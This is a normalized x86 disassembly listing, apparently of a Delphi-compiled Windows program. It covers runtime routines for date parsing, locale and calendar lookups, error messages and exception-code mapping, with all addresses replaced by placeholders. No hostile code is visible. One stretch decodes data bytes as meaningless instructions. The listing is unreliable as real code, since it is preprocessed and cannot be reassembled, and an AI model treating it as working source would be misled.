mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_40996c
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a828
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ab43
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a6e4
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c314
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a58c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a730
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404508
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407fac
mov eax [ ebp - 0x1c ]
call sub_40a778
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab4a
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_40400c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6ac
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a58c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6ac
test al al
je r-xdata
call sub_40996c
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a58c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409710
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4045ec
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6ac
mov edx ebx
mov eax esi
call sub_40a568
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4042a8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a730
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a7cc
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a568
mov eax esi
call sub_4042a8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_40996c
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4042a8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404508
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407f3c
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4042a8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404508
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407f3c
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40ab6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a620
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a620
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a620
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a58c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a568
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a620
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6ac
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a58c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a620
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6ac
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a568
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409608
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a620
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a58c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a620
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6ac
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a620
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a58c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ad60
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a828
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042a8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ad94
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ab6c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042a8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40adc8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a828
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ad94
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4042a8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40ab6c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ae54
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_4040d8
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40aea0
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_40403c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_4040d8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40aeec
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40af14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40aea0
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405d6c
sub_40af50
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b063
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40af14
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40403c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40af14
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40403c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40af14
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40403c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40af14
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40403c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b06a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40400c
retn
sub_40b074
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4041e0
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b0b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b115
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041e0
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408224
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b11c
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
inc ebx
sub_40b128
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b1bf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40aea0
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408224
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1c6
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b074
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b0b0
call EnumCalendarInfoA
sub_40b1d8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b3a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403fe8
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40aea0
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408224
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4042a8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3a9
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40400c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408820
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c29c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404508
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4042b0
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_40403c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408820
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042b0
inc ebx
jmp r-xdata
mov eax esi
call sub_4042a8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408820
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042b0
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042b0
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042b0
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041d0
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4042b0
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041d0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4042b0
sub_40b40c
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b400
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c3ec
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408744
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4052d8
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031c0
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408d68
mov eax [ ebp - 0x4 ]
call sub_4086b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4044a8
mov ebx eax
mov eax ebx
call sub_4086b4
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b594
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b40c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4052d8
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b10
call sub_40285c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4086b4
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b668
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40403c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_40b6a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b6fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408da8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40403c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b705
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
add esp 0xfffffff0
call sub_4035bc
sub_40b705
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_40b724
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405d6c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_40b760
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b7cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405d6c
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408da8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40403c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b7d3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
add esp 0xfffffff0
call sub_4035bc
sub_40b7d3
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_40b7f4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40403c
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_40b868
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028d0
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b8c9
mov eax 0xa0e0040
push esp
inc ebp
js r-xdata
cmp bh 0xff
pop ebx
retn
jo r-xdata
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b9d8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404080
jmp r-xdata
push ebx
mov eax edx
jmp sub_403a24
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9df
lea eax [ ebp - 0x20 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b668
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b868
mov edx eax
sub_40b93c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b9d8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404080
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9df
lea eax [ ebp - 0x20 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40ba2c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
